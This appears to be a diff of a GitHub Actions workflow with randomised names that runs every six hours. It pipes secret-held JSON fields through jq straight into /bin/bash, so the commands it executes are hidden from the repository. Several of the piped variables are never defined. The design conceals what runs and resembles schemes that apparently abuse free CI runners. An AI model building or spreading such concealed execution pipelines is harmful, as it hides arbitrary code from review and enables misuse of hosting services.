@@ -1,25 +1,24 @@
 name: qianshuzhong8912
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
+    - cron: '55 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qianshuzhong8912
         env:
-          jw46084: ${{ secrets.jw46084 }}
+          kx04: ${{ secrets.kx04 }}
         run: |
-          echo $jw46084 | jq -r .exkt9 | /bin/bash
-          echo $xk08826 | jq -r .qqsbh3 | /bin/bash
-          echo $uco93491 | jq -r .ucrd5 | /bin/bash
-          echo $be81002 | jq -r .dguw4097 | /bin/bash
-          echo $o68166 | jq -r .cr2468 | /bin/bash
-          echo $awo8 | jq -r .frnx012 | /bin/bash
-          echo $gmyn276 | jq -r .tgi86 | /bin/bash
-          echo $uhpd1915 | jq -r .lyi73 | /bin/bash
-          echo $qut0449 | jq -r .y046 | /bin/bash
-          echo $pnrau3 | jq -r .mm2 | /bin/bash
+          echo $kx04 | jq -r .wbxvm559 | /bin/bash
+          echo $b23641 | jq -r .msez284 | /bin/bash
+          echo $asmkr5560 | jq -r .cpfx9861 | /bin/bash
+          echo $yro44 | jq -r .kfcad622 | /bin/bash
+          echo $nyjb006 | jq -r .na3862 | /bin/bash
+          echo $zlal3049 | jq -r .fq388 | /bin/bash
+          echo $cy53275 | jq -r .iip69507 | /bin/bash
 
